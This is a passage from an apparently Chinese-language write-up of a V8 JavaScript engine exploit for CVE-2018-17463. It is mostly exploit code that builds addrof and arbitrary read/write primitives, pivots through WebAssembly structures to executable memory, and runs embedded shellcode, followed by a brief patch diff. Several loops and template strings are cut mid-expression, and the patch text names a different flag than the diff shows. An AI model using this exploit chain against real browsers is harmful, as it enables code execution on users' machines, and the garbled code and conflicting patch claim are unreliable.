        return (new Int64()).assignNeg(n);
    }
    // Return a + b
    function Add(a, b) {
        return (new Int64()).assignAdd(a, b);
    }
    // Return a - b
    function Sub(a, b) {
        return (new Int64()).assignSub(a, b);
    }
    // Some commonly used numbers.
    Int64.Zero = new Int64(0);
    Int64.One = new Int64(1);
    function utf8ToString(h, p) {
      let s = "";
      for (i = p; h[i]; i++) {
        s += String.fromCharCode(h[i]);
      }
      return s;
    }
    function log(x,y = ' '){
        console.log("[+] log:", x,y);   
    }
    let OPTIMIZATION_NUM = 10000;
    let OBJ_LEN = 0x20;
    let X;
    let Y;
    // use a obj to check whether CVE-2018-17463 exists
    function check_vul(){
        function bad_create(x){
            x.a;
            Object.create(x);
            return x.b;
        }
        for (let i = 0;i  `let ${b} = x.${b};`).join('\n')}
                return [${find_obj.join(', ')}];
            }
        `);
        for (let i = 0; i -(1+OBJ_LEN +0x4869) ){
                    log('b'+ j +' & b' + -(tmp[j]+0x4869) +" are collision in directory");
                    return ['b'+j , 'b' + -(tmp[j]+0x4869)];
                }
            }
        }
        throw "not found collision ";
    }
    // create primitive -> addrof
    function getOBJ4addr(obj){
        let res = {a:0x1234};
        for (let i = 0; i Arbitrary write
    function getOBJ4read(obj){
        let res = {a:0x1234};
        for (let i = 0; i JSFunciton");
        arbitraryWrite(mem,addr);
        let dv = new DataView(mem);
        SharedFunctionInfo_addr = Int64.fromDouble(dv.getFloat64(0x17,true));
        console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr);
        console.log("step 5: make ArrayBuffer's backing_store ->  SharedFunctionInfo");
        arbitraryWrite(mem,SharedFunctionInfo_addr.asDouble());
        WasmExportedFunctionData_addr =  Int64.fromDouble(dv.getFloat64(0x7,true));
        console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr);
        console.log("step 6: make ArrayBuffer's backing_store ->  WasmExportedFunctionData");
        arbitraryWrite(mem,WasmExportedFunctionData_addr.asDouble());
        WasmInstanceObject_addr =  Int64.fromDouble(dv.getFloat64(0xf,true));
        console.log("[+] WasmInstanceObject addr :"+WasmInstanceObject_addr);
        console.log("step 7: make ArrayBuffer's backing_store ->  WasmInstanceObject");
        arbitraryWrite(mem,WasmInstanceObject_addr.asDouble());
        imported_function_targets_addr =  Int64.fromDouble(dv.getFloat64(0xc7,true));
        console.log("[+] imported_function_targets addr :"+imported_function_targets_addr);
        console.log("step 8: make ArrayBuffer's backing_store ->  imported_function_targets");
        arbitraryWrite(mem,imported_function_targets_addr.asDouble());
        code_addr =  Int64.fromDouble(dv.getFloat64(0,true));
        console.log("[+] code addr :"+code_addr);
        log("step 9: make ArrayBuffer's backing_store ->  rwx_area");
        arbitraryWrite(mem,code_addr.asDouble());
        console.log("step 10: write shellcode for poping up a calculator");
        let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
        let write_tmp = new Uint8Array(mem);
        write_tmp.set(shellcode_calc);
        console.log("[+] Press Any key to execute Shellcode");
        readline();
        f();
    }
    exploit();
## 漏洞补丁
漏洞补丁很简单，在`commit
52a9e67a477bdb67ca893c25c145ef5191976220`中，将`CreateObject`的`flag`改为`Operator::kNoProperties`。
    diff --git a/src/compiler/js-operator.cc b/src/compiler/js-operator.cc
    index 5ed3f74..94b018c 100644
    --- a/src/compiler/js-operator.cc
    +++ b/src/compiler/js-operator.cc
    @@ -622,7 +622,7 @@ CompareOperationHint CompareOperationHintOf(const Operator* op) {
       V(CreateKeyValueArray, Operator::kEliminatable, 2, 1)                \
       V(CreatePromise, Operator::kEliminatable, 0, 1)                      \
       V(CreateTypedArray, Operator::kNoProperties, 5, 1)                   \
    -  V(CreateObject, Operator::kNoProperties, 1, 1)                       \
    +  V(CreateObject, Operator::kNoWrite, 1, 1)                            \
       V(ObjectIsArray, Operator::kNoProperties, 1, 1)                      \
       V(HasProperty, Operator::kNoProperties, 2, 1)                        \
       V(HasInPrototypeChain, Operator::kNoProperties, 2, 1)                \
## Reference
[1] 
[2] 
[3] 
[4] 
[5] 